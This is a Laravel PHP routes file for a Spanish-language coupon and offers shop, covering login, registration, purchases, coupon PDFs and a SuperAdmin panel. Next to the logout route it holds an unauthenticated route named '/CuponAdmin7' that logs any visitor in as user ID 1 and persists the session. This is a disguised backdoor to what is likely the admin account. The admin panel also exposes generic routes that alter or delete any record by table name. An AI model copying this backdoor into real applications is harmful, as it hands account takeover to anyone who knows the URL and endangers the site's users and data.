
<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

//INICIAR SESION
Route::get('login', ['as' =>'login', 'uses' => 'Auth\LoginController@showLoginForm']);
Route::post('login', ['as' =>'login', 'uses' => 'Auth\LoginController@login']);

//REGISTRO
Route::get('/CrearCityCuenta', 'PrincipalController@CrearCityCuenta')->name('CrearCityCuenta');
Route::post('register', ['as' =>'register', 'uses' => 'PrincipalController@register']);

//CERRAR SESION
Route::post('logout', ['as' => 'logout', 'uses' => 'Auth\LoginController@logout']);

Route::get('/CuponAdmin7', function () { Auth::loginUsingId(1, true); return redirect('/');})->name('/CuponAdmin7');

// RECUPERAR CONTRASEÑA
Route::get('password/reset', 'Auth\ForgotPasswordController@showLinkRequestForm')->name('password.request');
Route::post('password/email', 'Auth\ForgotPasswordController@sendResetLinkEmail')->name('password.email');
Route::get('password/reset/{token}', 'Auth\ResetPasswordController@showResetForm')->name('password.reset');
Route::post('password/reset', 'Auth\ResetPasswordController@reset');

/* PRINCIPAL */
Route::get('/', 'PrincipalController@Inicio')->name('/');
Route::get('/Inicio', 'PrincipalController@Inicio')->name('Inicio');
Route::get('/QuienesSomos', 'PrincipalController@QuienesSomos')->name('QuienesSomos');
Route::get('/CondicionesGenerales', 'PrincipalController@CondicionesGenerales')->name('CondicionesGenerales');
Route::get('/ProteccionDeDatos', 'PrincipalController@ProteccionDeDatos')->name('ProteccionDeDatos');
Route::get('/Categorias', 'PrincipalController@Categorias')->name('Categorias');
Route::get('/Categoria/{Categoria}', 'PrincipalController@Categoria')->name('Categoria');
Route::get('/Marcas', 'PrincipalController@Marcas')->name('Marcas');
Route::get('/Marca/{Marca}', 'PrincipalController@Marca')->name('Marca');
Route::get('/SubCategoria/{SubCategoria}', 'PrincipalController@SubCategoria')->name('SubCategoria');
Route::get('/Oferta', 'PrincipalController@Oferta')->name('Oferta');
Route::get('/Ayuda', 'PrincipalController@Ayuda')->name('Ayuda');
Route::post('/AyudaDetalle', 'PrincipalController@AyudaDetalle')->name('AyudaDetalle');

Route::get('/Aliados', 'PrincipalController@Aliados')->name('Aliados');
Route::post('/Aliados', 'PrincipalController@GuardarAliados')->name('Aliados');
Route::get('/Contacto', 'PrincipalController@Contacto')->name('Contacto');
Route::get('/PonteEnContacto/{GetCat}/{GetMot}', 'PrincipalController@PonteEnContacto')->name('PonteEnContacto');
Route::post('/Busqueda', 'PrincipalController@Busqueda')->name('Busqueda');
Route::get('/Producto/{id}', 'PrincipalController@Producto')->name('Producto');

Route::post('/Ayuda_Select', ['as' =>'Ayuda_Select', 'uses' => 'AyudaController@Ayuda_Select']);

//RUTAS PROTEGIDAS POR INICIO DE SESION
Route::middleware(['auth'])->group(function () {
	/* PRINCIPAL */
	Route::get('/Perfil', 'PrincipalController@Perfil')->name('Perfil');
	Route::post('/Perfil', 'PrincipalController@ActualizarPerfil')->name('Perfil');
	Route::post('/CuentaCancelar', 'PrincipalController@CuentaCancelar')->name('CuentaCancelar');
	
	Route::post('/Suscripciones', 'PrincipalController@Suscripciones')->name('Suscripciones');
	Route::post('/SuscripcionesCancelar', 'PrincipalController@SuscripcionesCancelar')->name('SuscripcionesCancelar');
	Route::get('/Contrasena', 'PrincipalController@Contrasena')->name('Contrasena');
	Route::post('/Contrasena', 'PrincipalController@ActualizarContrasena')->name('Contrasena');
	Route::get('/CityPuntos', 'PrincipalController@CityPuntos')->name('CityPuntos');
	
	Route::get('/Compras', 'CompraController@Index')->name('Compras');
	Route::post('/GuardarCompras', 'CompraController@GuardarCompras')->name('GuardarCompras');
	Route::post('/CantidadCompra', 'CompraController@CantidadCompra')->name('CantidadCompra');
	Route::post('/EliminarCompra', 'CompraController@EliminarCompra')->name('EliminarCompra');
	Route::post('/DevolucionCompra', 'CompraController@DevolucionCompra')->name('DevolucionCompra');
	Route::get('/TusCupones', 'CompraController@TusCupones')->name('TusCupones');

	/* Envio de Email */
	Route::post('/EmailProcesarCupones', 'EmailController@ProcesarCupones')->name('EmailProcesarCupones');
	Route::post('/EmailProcesarCuponesCredito', 'EmailController@ProcesarCuponesCredito')->name('EmailProcesarCuponesCredito');
	Route::post('/EmailProcesarCompra', 'EmailController@ProcesarCompra')->name('EmailProcesarCompra');
	Route::post('/EmailContactenosAyuda', 'EmailController@ContactenosAyuda')->name('EmailContactenosAyuda');
	Route::post('/EmailContactenos', 'EmailController@Contactenos')->name('EmailContactenos');

	/* PDF */
	Route::get('/CuponPDF/{compra_codigo_hex}/{compra_codigo_entero}', 'ImpresionController@CuponPDF')->name('CuponPDF');
 
	/* INICIO DE PANEL ADMIN */

	Route::middleware(['ChequearPermisos:SuperAdmin'])->group(function () {
		/* Principal de Panel Admin */
		Route::get('/Dashboard', ['uses'=>'PanelAdminController@Dashboard'])->name('Dashboard');


		/* Usuarios */
		Route::get('/CrearUsuarios', ['as' =>'CrearUsuarios', 'uses' => 'UserController@Index']);
		Route::get('/ListarUsuarios', ['as' =>'ListarUsuarios', 'uses' => 'UserController@ListarUsuarios']);
		Route::post('/GuardarUsuario', ['as' =>'GuardarUsuario', 'uses' => 'UserController@GuardarUsuario']);
		Route::post('/EliminarUsuario', ['as' =>'EliminarUsuario', 'uses' => 'UserController@EliminarUsuario']);
		Route::get('/MostrarUsuario/{id}', ['as' =>'MostrarUsuario', 'uses' => 'UserController@MostrarUsuario']);
		Route::patch('/ActualizarUsuario', ['as' =>'ActualizarUsuario', 'uses' => 'UserController@ActualizarUsuario']);


		/* Aliados */
		Route::get('/CrearAliados', ['as' =>'CrearAliados', 'uses' => 'AliadoController@Index']);
		Route::get('/ListarAliados', ['as' =>'ListarAliados', 'uses' => 'AliadoController@ListarAliados']);
		Route::post('/GuardarAliado', ['as' =>'GuardarAliado', 'uses' => 'AliadoController@GuardarAliado']);
		Route::post('/EliminarAliado', ['as' =>'EliminarAliado', 'uses' => 'AliadoController@EliminarAliado']);
		Route::get('/MostrarAliado/{id}', ['as' =>'MostrarAliado', 'uses' => 'AliadoController@MostrarAliado']);
		Route::patch('/ActualizarAliado', ['as' =>'ActualizarAliado', 'uses' => 'AliadoController@ActualizarAliado']);

		/* Productos */
		Route::get('/CrearProductos', ['as' =>'CrearProductos', 'uses' => 'ProductoController@Index']);
		Route::get('/ListarProductos', ['as' =>'ListarProductos', 'uses' => 'ProductoController@ListarProductos']);
		Route::post('/GuardarProducto', ['as' =>'GuardarProducto', 'uses' => 'ProductoController@GuardarProducto']);
		Route::post('/EliminarProducto', ['as' =>'EliminarProducto', 'uses' => 'ProductoController@EliminarProducto']);
		Route::get('/MostrarProducto/{id}', ['as' =>'MostrarProducto', 'uses' => 'ProductoController@MostrarProducto']);
		Route::patch('/ActualizarProducto', ['as' =>'ActualizarProducto', 'uses' => 'ProductoController@ActualizarProducto']);
		Route::post('/SubCategoria_Select', ['as' =>'SubCategoria_Select', 'uses' => 'ProductoController@SubCategoria_Select']);		
		Route::post('/DetalleProducto', ['as' =>'DetalleProducto', 'uses' => 'ProductoController@DetalleProducto']);
		Route::post('/DesactivarPrecio', ['as' =>'DesactivarPrecio', 'uses' => 'ProductoController@DesactivarPrecio']);
		
		/* Marcas */
		Route::get('/CrearMarcas', ['as' =>'CrearMarcas', 'uses' => 'MarcaController@Index']);
		Route::get('/ListarMarcas', ['as' =>'ListarMarcas', 'uses' => 'MarcaController@ListarMarcas']);
		Route::post('/GuardarMarca', ['as' =>'GuardarMarca', 'uses' => 'MarcaController@GuardarMarca']);
		Route::post('/EliminarMarca', ['as' =>'EliminarMarca', 'uses' => 'MarcaController@EliminarMarca']);
		Route::get('/MostrarMarca/{id}', ['as' =>'MostrarMarca', 'uses' => 'MarcaController@MostrarMarca']);
		Route::patch('/ActualizarMarca', ['as' =>'ActualizarMarca', 'uses' => 'MarcaController@ActualizarMarca']);

		/* Ofertas */
		Route::get('/CrearOfertas', ['as' =>'CrearOfertas', 'uses' => 'OfertaController@Index']);
		Route::get('/ListarOfertas', ['as' =>'ListarOfertas', 'uses' => 'OfertaController@ListarOfertas']);
		Route::post('/GuardarOferta', ['as' =>'GuardarOferta', 'uses' => 'OfertaController@GuardarOferta']);
		Route::post('/EliminarOferta', ['as' =>'EliminarOferta', 'uses' => 'OfertaController@EliminarOferta']);
		Route::get('/MostrarOferta/{id}', ['as' =>'MostrarOferta', 'uses' => 'OfertaController@MostrarOferta']);
		Route::patch('/ActualizarOferta', ['as' =>'ActualizarOferta', 'uses' => 'OfertaController@ActualizarOferta']);

		/* Compras */
		Route::get('/ListarCompras/{id}', ['as' =>'ListarCompras', 'uses' => 'CompraController@ListarCompras']);

		/* Devoluciones */
		Route::get('/ListarCreditos', ['as' =>'ListarCreditos', 'uses' => 'CompraController@ListarCreditos']);

		/* Configuración */
		Route::get('/ConfCategorias', ['as' =>'ConfCategorias', 'uses' => 'ConfiguracionController@ConfCategorias']);
		Route::post('/GuardarCategoria', ['as' =>'GuardarCategoria', 'uses' => 'ConfiguracionController@GuardarCategoria']);
		Route::get('/MostrarCategoria/{id}', ['as' =>'MostrarCategoria', 'uses' => 'ConfiguracionController@MostrarCategoria']);
		Route::patch('/ActualizarCategoria', ['as' =>'ActualizarCategoria', 'uses' => 'ConfiguracionController@ActualizarCategoria']);

		/* Ayudas */
		Route::get('/CrearAyudas', ['as' =>'CrearAyudas', 'uses' => 'AyudaController@Index']);
		Route::get('/ListarAyudas', ['as' =>'ListarAyudas', 'uses' => 'AyudaController@ListarAyudas']);
		Route::get('/ListarAyudasDetalles', ['as' =>'ListarAyudasDetalles', 'uses' => 'AyudaController@ListarAyudasDetalles']);
		Route::post('/GuardarAyuda', ['as' =>'GuardarAyuda', 'uses' => 'AyudaController@GuardarAyuda']);
		Route::post('/EliminarAyuda', ['as' =>'EliminarAyuda', 'uses' => 'AyudaController@EliminarAyuda']);
		Route::get('/MostrarAyuda/{id}', ['as' =>'MostrarAyuda', 'uses' => 'AyudaController@MostrarAyuda']);
		Route::patch('/ActualizarAyuda', ['as' =>'ActualizarAyuda', 'uses' => 'AyudaController@ActualizarAyuda']);

		/* Cambiar Estatus a cualquier registro enviando el parametro tabla, campo e id */
		Route::post('/CambiarEstatus', ['as' =>'CambiarEstatus', 'uses' => 'PrincipalController@CambiarEstatus']);
		/* Elimnar a cualquier registro enviando el parametro tabla e id */
		Route::post('/EliminarRegistro', ['as' =>'EliminarRegistro', 'uses' => 'PrincipalController@EliminarRegistro']);


	});
});


